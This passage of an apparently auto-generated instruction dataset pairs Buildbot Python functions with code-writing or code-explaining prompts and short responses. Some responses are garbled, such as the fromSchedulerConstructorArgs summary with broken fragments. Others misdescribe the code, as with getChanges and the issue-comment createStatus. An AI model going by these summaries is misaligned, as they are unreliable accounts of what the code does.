f.startswith(prefix):\n                        f = f[len(prefix):]\n                    else:\n                        log.msg(\"ignored file from svn commit: prefix '%s' \"\n                                \"does not match filename '%s'\" % (prefix, f))\n                        continue\n\n                # TODO: figure out how new directories are described, set\n                # .isdir\n                files.append(f)\n\n        if not files:\n            log.msg(\"no matching files found, ignoring commit\")\n            return None\n\n        return ('svn', dict(author=author, files=files, comments=comments,\n                            when=when, revision=rev))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses the branch notification message.", "response": "def parse(self, m, prefix=None):\n        \"\"\"Parse branch notification messages sent by Launchpad.\n        \"\"\"\n\n        subject = m[\"subject\"]\n        match = re.search(r\"^\\s*\\[Branch\\s+([^]]+)\\]\", subject)\n        if match:\n            repository = match.group(1)\n        else:\n            repository = None\n\n        # Put these into a dictionary, otherwise we cannot assign them\n        # from nested function definitions.\n        d = {'files': [], 'comments': \"\"}\n        gobbler = None\n        rev = None\n        author = None\n        when = util.now()\n\n        def gobble_comment(s):\n            d['comments'] += s + \"\\n\"\n\n        def gobble_removed(s):\n            d['files'].append('%s REMOVED' % s)\n\n        def gobble_added(s):\n            d['files'].append('%s ADDED' % s)\n\n        def gobble_modified(s):\n            d['files'].append('%s MODIFIED' % s)\n\n        def gobble_renamed(s):\n            match = re.search(r\"^(.+) => (.+)$\", s)\n            if match:\n                d['files'].append('%s RENAMED %s' %\n                                  (match.group(1), match.group(2)))\n            else:\n                d['files'].append('%s RENAMED' % s)\n\n        lines = list(body_line_iterator(m, True))\n        rev = None\n        while lines:\n            line = str(lines.pop(0), \"utf-8\", errors=\"ignore\")\n\n            # revno: 101\n            match = re.search(r\"^revno: ([0-9.]+)\", line)\n            if match:\n                rev = match.group(1)\n\n            # committer: Joe <joe@acme.com>\n            match = re.search(r\"^committer: (.*)$\", line)\n            if match:\n                author = match.group(1)\n\n            # timestamp: Fri 2009-05-15 10:35:43 +0200\n            # datetime.strptime() is supposed to support %z for time zone, but\n            # it does not seem to work. So handle the time zone manually.\n            match = re.search(\n                r\"^timestamp: [a-zA-Z]{3} (\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}) ([-+])(\\d{2})(\\d{2})$\", line)\n            if match:\n                datestr = match.group(1)\n                tz_sign = match.group(2)\n                tz_hours = match.group(3)\n                tz_minutes = match.group(4)\n                when = parseLaunchpadDate(\n                    datestr, tz_sign, tz_hours, tz_minutes)\n\n            if re.search(r\"^message:\\s*$\", line):\n                gobbler = gobble_comment\n            elif re.search(r\"^removed:\\s*$\", line):\n                gobbler = gobble_removed\n            elif re.search(r\"^added:\\s*$\", line):\n                gobbler = gobble_added\n            elif re.search(r\"^renamed:\\s*$\", line):\n                gobbler = gobble_renamed\n            elif re.search(r\"^modified:\\s*$\", line):\n                gobbler = gobble_modified\n            elif re.search(r\"^  \", line) and gobbler:\n                gobbler(line[2:-1])  # Use :-1 to gobble trailing newline\n\n        # Determine the name of the branch.\n        branch = None\n        if self.branchMap and repository:\n            if repository in self.branchMap:\n                branch = self.branchMap[repository]\n            elif (\"lp:\" + repository) in self.branchMap:\n                branch = self.branchMap['lp:' + repository]\n        if not branch:\n            if self.defaultBranch:\n                branch = self.defaultBranch\n            else:\n                if repository:\n                    branch = 'lp:' + repository\n                else:\n                    branch = None\n\n        if rev and author:\n            return ('bzr', dict(author=author, files=d['files'],\n                                comments=d['comments'],\n                                when=when, revision=rev,\n                                branch=branch, repository=repository or ''))\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef remote_write(self, data):\n        data = unicode2bytes(data)\n        if self.remaining is not None:\n            if len(data) > self.remaining:\n                data = data[:self.remaining]\n            self.fp.write(data)\n            self.remaining = self.remaining - len(data)\n        else:\n            self.fp.write(data)", "response": "Called from remote worker to write data to the local file."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef remote_close(self):\n        self.fp.close()\n        self.fp = None\n        # on windows, os.rename does not automatically unlink, so do it\n        # manually\n        if os.path.exists(self.destfile):\n            os.unlink(self.destfile)\n        os.rename(self.tmpname, self.destfile)\n        self.tmpname = None\n        if self.mode is not None:\n            os.chmod(self.destfile, self.mode)", "response": "Called by remote worker to state that no more data will be transferred"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef remote_unpack(self):\n        # Make sure remote_close is called, otherwise atomic rename won't happen\n        self.remote_close()\n\n        # Map configured compression to a TarFile setting\n        if self.compress == 'bz2':\n            mode = 'r|bz2'\n        elif self.compress == 'gz':\n            mode = 'r|gz'\n        else:\n            mode = 'r'\n\n        # Unpack archive and clean up after self\n        archive = tarfile.open(name=self.tarname, mode=mode)\n        archive.extractall(path=self.destroot)\n        archive.close()\n        os.remove(self.tarname)", "response": "Unpack the archive and clean up after self."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef remote_read(self, maxlength):\n        if self.fp is None:\n            return ''\n\n        data = self.fp.read(maxlength)\n        return data", "response": "Called from remote worker to read at most L{maxlength} bytes of data from file\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef remote_update(self, updates):\n        updates = decode(updates)\n        self.worker.messageReceivedFromWorker()\n        max_updatenum = 0\n        for (update, num) in updates:\n            # log.msg(\"update[%d]:\" % num)\n            try:\n                if self.active and not self.ignore_updates:\n                    self.remoteUpdate(update)\n            except Exception:\n                # log failure, terminate build, let worker retire the update\n                self._finished(Failure())\n                # TODO: what if multiple updates arrive? should\n                # skip the rest but ack them all\n            if num > max_updatenum:\n                max_updatenum = num\n        return max_updatenum", "response": "This method is called by the worker s sendUpdate method so that the worker can receive updates from the running remote command."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncall by the worker to notify me that the remote command has finished.", "response": "def remote_complete(self, failure=None):\n        \"\"\"\n        Called by the worker's\n        L{buildbot_worker.base.WorkerForBuilderBase.commandComplete} to\n        notify me the remote command has finished.\n\n        @type  failure: L{twisted.python.failure.Failure} or None\n\n        @rtype: None\n        \"\"\"\n        self.worker.messageReceivedFromWorker()\n        # call the real remoteComplete a moment later, but first return an\n        # acknowledgement so the worker can retire the completion message.\n        if self.active:\n            eventually(self._finished, failure)\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn True if the given attrGroup has a member of the given attr.", "response": "def _hasAttrGroupMember(self, attrGroup, attr):\n        \"\"\"\n        The hasattr equivalent for attribute groups: returns whether the given\n        member is in the attribute group.\n        \"\"\"\n        method_name = '%s_%s' % (attrGroup, attr)\n        return hasattr(self, method_name)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of all members in the attribute group.", "response": "def _listAttrGroupMembers(self, attrGroup):\n        \"\"\"\n        Returns a list of all members in the attribute group.\n        \"\"\"\n        from inspect import getmembers, ismethod\n        methods = getmembers(self, ismethod)\n        group_prefix = attrGroup + '_'\n        group_len = len(group_prefix)\n        group_members = [method[0][group_len:]\n                         for method in methods\n                         if method[0].startswith(group_prefix)]\n        return group_members"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates a property in a source by codebase.", "response": "def updateSourceProperty(self, name, value, source=''):\n        \"\"\"\n        Update a property, indexing the property by codebase if codebase is not\n        ''.  Source steps should generally use this instead of setProperty.\n        \"\"\"\n        # pick a decent source name\n        if source == '':\n            source = self.__class__.__name__\n\n        if self.codebase != '':\n            assert not isinstance(self.getProperty(name, None), str), \\\n                \"Sourcestep %s has a codebase, other sourcesteps don't\" \\\n                % self.name\n            property_dict = self.getProperty(name, {})\n            property_dict[self.codebase] = value\n            super().setProperty(name, property_dict, source)\n        else:\n            assert not isinstance(self.getProperty(name, None), dict), \\\n                \"Sourcestep %s does not have a codebase, other sourcesteps do\" \\\n                % self.name\n            super().setProperty(name, value, source)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _gerrit_user_to_author(props, username=\"unknown\"):\n    username = props.get(\"username\", username)\n    username = props.get(\"name\", username)\n    if \"email\" in props:\n        username += \" <%(email)s>\" % props\n    return username", "response": "Convert Gerrit account properties to Buildbot author format"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the full data for the builders and steps.", "response": "def fullData(master):\n    \"\"\"\n        Send the actual configuration of the builders, how the steps are agenced.\n        Note that full data will never send actual detail of what command is run, name of servers, etc.\n    \"\"\"\n\n    builders = []\n    for b in master.config.builders:\n        steps = []\n        for step in b.factory.steps:\n            steps.append(getName(step))\n        builders.append(steps)\n    return {'builders': builders}"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates a pair of directory and file - list for installation.", "response": "def include(d, e):\n    \"\"\"Generate a pair of (directory, file-list) for installation.\n\n    'd' -- A directory\n    'e' -- A glob pattern\"\"\"\n\n    return (d, [f for f in glob.glob('%s/%s' % (d, e)) if os.path.isfile(f)])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef define_plugin_entry(name, module_name):\n    if isinstance(name, tuple):\n        entry, name = name\n    else:\n        entry = name\n    return '%s = %s:%s' % (entry, module_name, name)", "response": "helper to produce lines suitable for setup. py s entry_points\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef define_plugin_entries(groups):\n    result = dict()\n\n    for group, modules in groups:\n        tempo = []\n        for module_name, names in modules:\n            tempo.extend([define_plugin_entry(name, module_name)\n                          for name in names])\n        result[group] = tempo\n\n    return result", "response": "helper to all groups for plugins\n   "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fromSchedulerConstructorArgs(change_filter=None,\n                                     branch=NotABranch, categories=None):\n        \"\"\"\n        Static method to create a filter based on constructor args\n        change_filter, branch, and categories; use default values @code{None},\n        @code{NotABranch}, and @code{None}, respectively.  These arguments are\n        interpreted as documented for the\n        L{buildbot.schedulers.basic.Scheduler} class.\n\n        @returns: L{ChangeFilter} instance or None for not filtering\n        \"\"\"\n\n        # use a change_filter, if given one\n        if change_filter:\n            if (branch is not NotABranch or categories is not None):\n                raise RuntimeError(\"cannot specify both change_filter and \"\n                                   \"branch or categories\")\n            return change_filter\n        elif branch is not NotABranch or categories:\n            # build a change filter from the deprecated category and branch\n            # args\n            cfargs = {}\n            if branch is not NotABranch:\n                cfargs['branch'] = branch\n            if categories:\n                cfargs['category'] = categories\n            return ChangeFilter(**cfargs)\n        else:\n            return None", "response": "Static method to create a change filter based on constructor args\nalid branch and categories ; use default values for NotABranch and None for filtering\nalid."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _process_changes(self, newRev, branch):\n\n        # initial run, don't parse all history\n        if not self.lastRev:\n            return\n        rebuild = False\n        if newRev in self.lastRev.values():\n            if self.buildPushesWithNoCommits:\n                existingRev = self.lastRev.get(branch)\n                if existingRev is None:\n                    # This branch was completely unknown, rebuild\n                    log.msg('gitpoller: rebuilding {} for new branch \"{}\"'.format(\n                            newRev, branch))\n                    rebuild = True\n                elif existingRev != newRev:\n                    # This branch is known, but it now points to a different\n                    # commit than last time we saw it, rebuild.\n                    log.msg('gitpoller: rebuilding {} for updated branch \"{}\"'.format(\n                            newRev, branch))\n                    rebuild = True\n\n        # get the change list\n        revListArgs = (['--format=%H', '{}'.format(newRev)] +\n                       ['^' + rev\n                        for rev in sorted(self.lastRev.values())] +\n                       ['--'])\n        self.changeCount = 0\n        results = yield self._dovccmd('log', revListArgs, path=self.workdir)\n\n        # process oldest change first\n        revList = results.split()\n        revList.reverse()\n\n        if rebuild and not revList:\n            revList = [newRev]\n\n        self.changeCount = len(revList)\n        self.lastRev[branch] = newRev\n\n        if self.changeCount:\n            log.msg('gitpoller: processing {} changes: {} from \"{}\" branch \"{}\"'.format(\n                    self.changeCount, revList, self.repourl, branch))\n\n        for rev in revList:\n            dl = defer.DeferredList([\n                self._get_commit_timestamp(rev),\n                self._get_commit_author(rev),\n                self._get_commit_files(rev),\n                self._get_commit_comments(rev),\n            ], consumeErrors=True)\n\n            results = yield dl\n\n            # check for failures\n            failures = [r[1] for r in results if not r[0]]\n            if failures:\n                for failure in failures:\n                    log.err(\n                        failure, \"while processing changes for {} {}\".format(newRev, branch))\n                # just fail on the first error; they're probably all related!\n                failures[0].raiseException()\n\n            timestamp, author, files, comments = [r[1] for r in results]\n\n            yield self.master.data.updates.addChange(\n                author=author,\n                revision=bytes2unicode(rev, encoding=self.encoding),\n                files=files, comments=comments, when_timestamp=timestamp,\n                branch=bytes2unicode(self._removeHeads(branch)),\n                project=self.project,\n                repository=bytes2unicode(self.repourl, encoding=self.encoding),\n                category=self.category, src='git')", "response": "Process changes from the current revision to the new revision."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nclean up the entire process.", "response": "def cleanShutdown(self, quickMode=False, stopReactor=True, _reactor=reactor):\n        \"\"\"Shut down the entire process, once all currently-running builds are\n        complete.\n        quickMode will mark all builds as retry (except the ones that were triggered)\n        \"\"\"\n        if self.shuttingDown:\n            return\n        log.msg(\"Initiating clean shutdown\")\n        self.shuttingDown = True\n        # first, stop the distributor; this will finish any ongoing scheduling\n        # operations before firing\n        yield self.brd.disownServiceParent()\n\n        # Double check that we're still supposed to be shutting down\n        # The shutdown may have been cancelled!\n        while self.shuttingDown:\n            if quickMode:\n                for builder in self.builders.values():\n                    # As we stop the builds, builder.building might change during loop\n                    # so we need to copy the list\n                    for build in list(builder.building):\n                        # if build is waited for then this is a sub-build, so\n                        # no need to retry it\n                        if sum(br.waitedFor for br in build.requests):\n                            results = CANCELLED\n                        else:\n                            results = RETRY\n                        is_building = build.workerforbuilder.state == States.BUILDING\n                        build.stopBuild(\"Master Shutdown\", results)\n                        if not is_building:\n                            # if it is not building, then it must be a latent worker\n                            # which is substantiating. Cancel it.\n                            build.workerforbuilder.worker.insubstantiate()\n            # then wait for all builds to finish\n            dl = []\n            for builder in self.builders.values():\n                for build in builder.building:\n                    # build may be waiting for ping to worker to succeed which\n                    # may never happen if the connection to worker was broken\n                    # without TCP connection being severed\n                    build.workerforbuilder.abortPingIfAny()\n\n                    dl.append(build.waitUntilFinished())\n            if not dl:\n                log.msg(\"No running jobs, starting shutdown immediately\")\n            else:\n                log.msg(\"Waiting for %i build(s) to finish\" % len(dl))\n                yield defer.DeferredList(dl)\n\n            # Check that there really aren't any running builds\n            n = 0\n            for builder in self.builders.values():\n                if builder.building:\n                    num_builds = len(builder.building)\n                    log.msg(\"Builder %s has %i builds running\" %\n                            (builder, num_builds))\n                    n += num_builds\n            if n > 0:\n                log.msg(\n                    \"Not shutting down, there are %i builds running\" % n)\n                log.msg(\"Trying shutdown sequence again\")\n                yield util.asyncSleep(1)\n            else:\n                if stopReactor and self.shuttingDown:\n                    log.msg(\"Stopping reactor\")\n                    _reactor.stop()\n                break\n\n        if not self.shuttingDown:\n            yield self.brd.setServiceParent(self)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts a Lock identifier into an actual Lock instance.", "response": "def getLockByID(self, lockid):\n        \"\"\"Convert a Lock identifier into an actual Lock instance.\n        @param lockid: a locks.MasterLock or locks.WorkerLock instance\n        @return: a locks.RealMasterLock or locks.RealWorkerLock instance\n        \"\"\"\n        assert isinstance(lockid, (locks.MasterLock, locks.WorkerLock))\n        if lockid not in self.locks:\n            self.locks[lockid] = lockid.lockClass(lockid)\n        # if the master.cfg file has changed maxCount= on the lock, the next\n        # time a build is started, they'll get a new RealLock instance. Note\n        # that this requires that MasterLock and WorkerLock (marker) instances\n        # be hashable and that they should compare properly.\n        return self.locks[lockid]"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef maybeStartBuildsForWorker(self, worker_name):\n        builders = self.getBuildersForWorker(worker_name)\n        self.brd.maybeStartBuildsOn([b.name for b in builders])", "response": "Call this when something suggests that a particular worker may now be\n        available to start a build."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef getChanges(self, request):\n\n        def firstOrNothing(value):\n            \"\"\"\n            Small helper function to return the first value (if value is a list)\n            or return the whole thing otherwise.\n\n            Make sure to properly decode bytes to unicode strings.\n            \"\"\"\n            if (isinstance(value, type([]))):\n                value = value[0]\n            return bytes2unicode(value)\n\n        args = request.args\n        # first, convert files, links and properties\n        files = None\n        if args.get(b'files'):\n            files = json.loads(firstOrNothing(args.get(b'files')))\n        else:\n            files = []\n\n        properties = None\n        if args.get(b'properties'):\n            properties = json.loads(firstOrNothing(args.get(b'properties')))\n        else:\n            properties = {}\n\n        revision = firstOrNothing(args.get(b'revision'))\n        when = firstOrNothing(args.get(b'when_timestamp'))\n        if when is None:\n            when = firstOrNothing(args.get(b'when'))\n        if when is not None:\n            when = float(when)\n        author = firstOrNothing(args.get(b'author'))\n        if not author:\n            author = firstOrNothing(args.get(b'who'))\n        comments = firstOrNothing(args.get(b'comments'))\n        branch = firstOrNothing(args.get(b'branch'))\n        category = firstOrNothing(args.get(b'category'))\n        revlink = firstOrNothing(args.get(b'revlink'))\n        repository = firstOrNothing(args.get(b'repository')) or ''\n        project = firstOrNothing(args.get(b'project')) or ''\n        codebase = firstOrNothing(args.get(b'codebase'))\n\n        chdict = dict(author=author, files=files, comments=comments,\n                      revision=revision, when_timestamp=when,\n                      branch=branch, category=category, revlink=revlink,\n                      properties=properties, repository=repository,\n                      project=project, codebase=codebase)\n        return ([chdict], None)", "response": "Returns a list of all changes that have occurred in the current build."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate and return a L{BBRefTargetDirective subclass.", "response": "def make_ref_target_directive(ref_type, indextemplates=None, **kwargs):\n    \"\"\"\n    Create and return a L{BBRefTargetDirective} subclass.\n    \"\"\"\n    class_vars = dict(ref_type=ref_type, indextemplates=indextemplates)\n    class_vars.update(kwargs)\n    return type(\"BB%sRefTargetDirective\" % (ref_type.capitalize(),),\n                (BBRefTargetDirective,), class_vars)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating and return a L{BBIndex subclass for use in the domain s C { indices }", "response": "def make_index(name, localname):\n    \"\"\"\n    Create and return a L{BBIndex} subclass, for use in the domain's C{indices}\n    \"\"\"\n    return type(\"BB%sIndex\" % (name.capitalize(),),\n                (BBIndex,),\n                dict(name=name, localname=localname))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nresolves a reference to a directive of this class", "response": "def resolve_ref(cls, domain, env, fromdocname, builder, typ, target, node,\n                    contnode):\n        \"\"\"\n        Resolve a reference to a directive of this class\n        \"\"\"\n        targets = domain.data['targets'].get(cls.ref_type, {})\n        try:\n            todocname, targetname = targets[target]\n        except KeyError:\n            env.warn(fromdocname, \"Missing BB reference: bb:%s:%s\" % (cls.ref_type, target),\n                     node.line)\n            return None\n\n        return make_refnode(builder, fromdocname,\n                            todocname, targetname,\n                            contnode, target)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nresolves a reference to an index to the document containing the index.", "response": "def resolve_ref(cls, domain, env, fromdocname, builder, typ, target, node,\n                    contnode):\n        \"\"\"\n        Resolve a reference to an index to the document containing the index,\n        using the index's C{localname} as the content of the link.\n        \"\"\"\n        # indexes appear to be automatically generated at doc DOMAIN-NAME\n        todocname = \"bb-%s\" % target\n\n        node = nodes.reference('', '', internal=True)\n        node['refuri'] = builder.get_relative_uri(fromdocname, todocname)\n        node['reftitle'] = cls.localname\n        node.append(nodes.emphasis(cls.localname, cls.localname))\n        return node"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef load(self):\n        # If we are given a string, open it up else assume it's something we\n        # can call read on.\n        if isinstance(self.specfile, str):\n            f = open(self.specfile, 'r')\n        else:\n            f = self.specfile\n\n        for line in f:\n            if self.v_regex.match(line):\n                self._pkg_version = self.v_regex.match(line).group(1)\n            if self.n_regex.match(line):\n                self._pkg_name = self.n_regex.match(line).group(1)\n        f.close()\n        self._loaded = True", "response": "load the properties from the file"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef consume(self, routingKey, msg):\n        builder_info = yield self.master.data.get((\"builders\", msg['builderid']))\n\n        if self._builder_name_matches(builder_info):\n            properties = yield self.master.data.get((\"builds\", msg['buildid'], \"properties\"))\n\n            if self._regex:\n                filtered_prop_names = [\n                    pn for pn in properties if re.match(self._property_name, pn)]\n            else:\n                filtered_prop_names = [self._property_name]\n\n            for pn in filtered_prop_names:\n                try:\n                    ret_val = self._callback(properties, pn)\n                except KeyError:\n                    raise CaptureCallbackError(\"CaptureProperty failed.\"\n                                               \" The property %s not found for build number %s on\"\n                                               \" builder %s.\"\n                                               % (pn, msg['number'], builder_info['name']))\n                context = self._defaultContext(msg, builder_info['name'])\n                series_name = \"%s-%s\" % (builder_info['name'], pn)\n                post_data = {\n                    \"name\": pn,\n                    \"value\": ret_val\n                }\n                yield self._store(post_data, series_name, context)\n\n        else:\n            yield defer.succeed(None)", "response": "This method is called by the capture service when a capture message is received."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef consume(self, routingKey, msg):\n        builder_info = yield self.master.data.get((\"builders\", msg['builderid']))\n        if self._builder_name_matches(builder_info):\n            try:\n                ret_val = self._callback(*self._retValParams(msg))\n            except Exception as e:\n                # catching generic exceptions is okay here since we propagate\n                # it\n                raise CaptureCallbackError(\"%s Exception raised: %s with message: %s\" %\n                                           (self._err_msg(msg, builder_info['name']),\n                                            type(e).__name__, str(e)))\n\n            context = self._defaultContext(msg, builder_info['name'])\n            post_data = {\n                self._time_type: ret_val\n            }\n            series_name = \"%s-build-times\" % builder_info['name']\n            yield self._store(post_data, series_name, context)\n\n        else:\n            yield defer.succeed(None)", "response": "Consumes a capture build start time."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef consume(self, routingKey, msg):\n        build_data = msg['build_data']\n        builder_info = yield self.master.data.get((\"builders\", build_data['builderid']))\n\n        if self._builder_name_matches(builder_info) and self._data_name == msg['data_name']:\n            try:\n                ret_val = self._callback(msg['post_data'])\n            except Exception as e:\n                raise CaptureCallbackError(\"CaptureData failed for build %s of builder %s.\"\n                                           \" Exception generated: %s with message %s\"\n                                           % (build_data['number'], builder_info['name'],\n                                              type(e).__name__, str(e)))\n            post_data = ret_val\n            series_name = '%s-%s' % (builder_info['name'], self._data_name)\n            context = self._defaultContext(build_data, builder_info['name'])\n            yield self._store(post_data, series_name, context)", "response": "Consumes the data sent from yieldMetricsValue and sends it to the storage backends."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a status for the given sha.", "response": "def createStatus(self,\n                     repo_user, repo_name, sha, state, target_url=None,\n                     context=None, issue=None, description=None):\n        \"\"\"\n        :param repo_user: GitHub user or organization\n        :param repo_name: Name of the repository\n        :param sha: Full sha to create the status for.\n        :param state: one of the following 'pending', 'success', 'error'\n                      or 'failure'.\n        :param target_url: Target url to associate with this status.\n        :param description: Short description of the status.\n        :param context: Build context\n        :return: A deferred with the result from GitHub.\n\n        This code comes from txgithub by @tomprince.\n        txgithub is based on twisted's webclient agent, which is much less reliable and featureful\n        as txrequest (support for proxy, connection pool, keep alive, retry, etc)\n        \"\"\"\n        payload = {'state': state}\n\n        if description is not None:\n            payload['description'] = description\n\n        if target_url is not None:\n            payload['target_url'] = target_url\n\n        if context is not None:\n            payload['context'] = context\n\n        return self._http.post(\n            '/'.join(['/repos', repo_user, repo_name, 'statuses', sha]),\n            json=payload)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef createStatus(self,\n                     repo_user, repo_name, sha, state, target_url=None,\n                     context=None, issue=None, description=None):\n        \"\"\"\n        :param repo_user: GitHub user or organization\n        :param repo_name: Name of the repository\n        :param issue: Pull request number\n        :param state: one of the following 'pending', 'success', 'error'\n                      or 'failure'.\n        :param description: Short description of the status.\n        :return: A deferred with the result from GitHub.\n\n        This code comes from txgithub by @tomprince.\n        txgithub is based on twisted's webclient agent, which is much less reliable and featureful\n        as txrequest (support for proxy, connection pool, keep alive, retry, etc)\n        \"\"\"\n        payload = {'body': description}\n\n        return self._http.post(\n            '/'.join(['/repos', repo_user, repo_name, 'issues', issue, 'comments']),\n            json=payload)", "response": "Creates a status for a specific branch."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstopping a worker process by sending it a signal.", "response": "def stopWorker(basedir, quiet, signame=\"TERM\"):\n    \"\"\"\n    Stop worker process by sending it a signal.\n\n    Using the specified basedir path, read worker process's pid file and\n    try to terminate that process with specified signal.\n\n    @param basedir: worker's basedir path\n    @param   quite: if False, don't print any messages to stdout\n    @param signame: signal to send to the worker process\n\n    @raise WorkerNotRunning: if worker pid file is not found\n    \"\"\"\n    import signal\n\n    os.chdir(basedir)\n    try:\n        f = open(\"twistd.pid\", \"rt\")\n    except IOError:\n        raise WorkerNotRunning()\n\n    pid = int(f.read().strip())\n    signum = getattr(signal, \"SIG\" + signame)\n    timer = 0\n    try:\n        os.kill(pid, signum)\n    except OSError as e:\n        if e.errno != 3:\n            raise\n\n    time.sleep(0.1)\n    while timer < 10:\n        # poll once per second until twistd.pid goes away, up to 10 seconds\n        try:\n            os.kill(pid, 0)\n        except OSError:\n            if not quiet:\n                print(\"worker process {0} is dead\".format(pid))\n            return 0\n        timer += 1\n        time.sleep(1)\n    if not quiet:\n        print(\"never saw process go away\")\n    return 1"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a new Build instance.", "response": "def newBuild(self, requests):\n        \"\"\"Create a new Build instance.\n\n        @param requests: a list of buildrequest dictionaries describing what is\n        to be built\n        \"\"\"\n        b = self.buildClass(requests)\n        b.useProgress = self.useProgress\n        b.workdir = self.workdir\n        b.setStepFactories(self.steps)\n        return b"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nextracts file name line number and warning text from a regular expression match.", "response": "def warnExtractFromRegexpGroups(self, line, match):\n        \"\"\"\n        Extract file name, line number, and warning text as groups (1,2,3)\n        of warningPattern match.\"\"\"\n        file = match.group(1)\n        lineNo = match.group(2)\n        if lineNo is not None:\n            lineNo = int(lineNo)\n        text = match.group(3)\n        return (file, lineNo, text)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a summary of the log for this step.", "response": "def createSummary(self, log):\n        \"\"\"\n        Match log lines against warningPattern.\n\n        Warnings are collected into another log for this step, and the\n        build-wide 'warnings-count' is updated.\"\"\"\n\n        # If there were any warnings, make the log if lines with warnings\n        # available\n        if self.warnCount:\n            self.addCompleteLog(\"warnings (%d)\" % self.warnCount,\n                                \"\\n\".join(self.loggedWarnings) + \"\\n\")\n\n        warnings_stat = self.getStatistic('warnings', 0)\n        self.setStatistic('warnings', warnings_stat + self.warnCount)\n\n        old_count = self.getProperty(\"warnings-count\", 0)\n        self.setProperty(\n            \"warnings-count\", old_count + self.warnCount, \"WarningCountingShellCommand\")"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nevaluate the cppcheck command.", "response": "def evaluateCommand(self, cmd):\n        \"\"\" cppcheck always return 0, unless a special parameter is given \"\"\"\n        for msg in self.flunkingIssues:\n            if self.counts[msg] != 0:\n                return FAILURE\n        if self.getProperty('cppcheck-total') != 0:\n            return WARNINGS\n        return SUCCESS"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, entry):\n        try:\n            output = yield utils.getProcessOutput(\n                \"pass\",\n                args=[entry],\n                env=self._env\n            )\n            return output.decode(\"utf-8\", \"ignore\").splitlines()[0]\n        except IOError:\n            return None", "response": "get the value from pass identified by entry"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\npatches startService and stopService so that they check the previous state first.", "response": "def patch():\n    \"\"\"\n    Patch startService and stopService so that they check the previous state\n    first.\n\n    (used for debugging only)\n    \"\"\"\n    from twisted.application.service import Service\n    old_startService = Service.startService\n    old_stopService = Service.stopService\n\n    def startService(self):\n        assert not self.running, \"%r already running\" % (self,)\n        return old_startService(self)\n\n    def stopService(self):\n        assert self.running, \"%r already stopped\" % (self,)\n        return old_stopService(self)\n    Service.startService = startService\n    Service.stopService = stopService"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nperforming any periodic database cleanup tasks.", "response": "def _doCleanup(self):\n        \"\"\"\n        Perform any periodic database cleanup tasks.\n\n        @returns: Deferred\n        \"\"\"\n        # pass on this if we're not configured yet\n        if not self.configured_url:\n            return\n\n        d = self.changes.pruneChanges(self.master.config.changeHorizon)\n        d.addErrback(log.err, 'while pruning changes')\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset up the database for this user.", "response": "def set_up(self, u, engine):\n        \"\"\"Special setup for sqlite engines\"\"\"\n        def connect_listener_enable_fk(connection, record):\n            # fk must be enabled for all connections\n            if not getattr(engine, \"fk_disabled\", False):\n                return  # http://trac.buildbot.net/ticket/3490#ticket\n                # connection.execute('pragma foreign_keys=ON')\n\n        sa.event.listen(engine.pool, 'connect', connect_listener_enable_fk)\n        # try to enable WAL logging\n        if u.database:\n            def connect_listener(connection, record):\n                connection.execute(\"pragma checkpoint_fullfsync = off\")\n\n            sa.event.listen(engine.pool, 'connect', connect_listener)\n\n            log.msg(\"setting database journal mode to 'wal'\")\n            try:\n                engine.execute(\"pragma journal_mode = wal\")\n            except Exception:\n                log.msg(\"failed to set journal mode - database may fail\")"}
